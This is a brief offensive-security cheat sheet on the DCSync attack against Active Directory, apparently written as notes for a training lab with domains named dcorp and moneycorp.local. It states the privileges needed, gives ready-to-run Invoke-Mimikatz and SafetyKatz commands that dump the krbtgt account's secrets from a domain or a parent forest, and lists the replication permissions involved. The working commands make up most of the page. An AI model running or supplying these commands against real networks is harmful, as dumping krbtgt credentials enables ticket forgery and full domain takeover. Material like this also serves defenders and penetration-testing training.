# DC Sync

Need **Domain Admin**, **Enterprise Admin** or **Domain Controller** privilege to make this attack happen.

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' 

SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

# For parent domain or different forest
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```
{% endcode %}

For DCsync to work below two are the main permissions that are needed:

* Replicating Directory Changes
* Replicating Directory Changese All
